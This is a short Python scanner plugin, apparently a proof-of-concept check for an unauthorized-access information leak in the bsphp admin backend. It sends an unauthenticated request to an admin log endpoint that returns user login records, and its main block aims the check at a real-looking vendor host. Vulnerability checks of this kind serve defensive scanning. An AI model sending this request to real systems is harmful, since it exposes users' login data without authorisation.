# coding:utf-8
import requests
import json

def get_plugin_info():
    plugin_info = {
        "name" : "bsphp信息泄露",
        "info" : "bsphp后台某接口未授权访问导致信息泄露",
        "level" : "中危",
        "type" : "信息泄露",
        "author" : "zinc",
        "url": "",
        "keyword" : "server:web",
        "source" : 1,
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        path = '/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0'
        url = 'http://%s:%d%s' % (ip, port, path)
        r = requests.get(url)
        result = json.loads(r.content)
        if result.has_key('data') and  result.has_key('count'):
            return u"信息泄露"

    except Exception as e:
        print e

if __name__ == '__main__':
    check('app.bsphp.com', 80, 3)